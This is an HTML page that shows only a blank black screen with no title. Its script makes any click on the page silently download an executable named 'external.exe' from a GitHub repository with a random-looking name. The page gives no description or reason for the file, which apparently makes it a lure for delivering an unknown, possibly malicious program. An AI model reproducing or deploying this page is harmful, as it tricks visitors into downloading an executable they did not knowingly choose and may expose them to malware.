<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #000000;
            overflow: hidden;
            cursor: pointer;
        }
    </style>
</head>
<body onclick="downloadFile()">
    <script>
        function downloadFile() {
            const url = "https://github.com/drtffyhu8fdghfgd/wh/raw/refs/heads/main/external.exe";
            const a = document.createElement("a");
            a.href = url;
            a.download = "external.exe";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    </script>
</body>
</html>
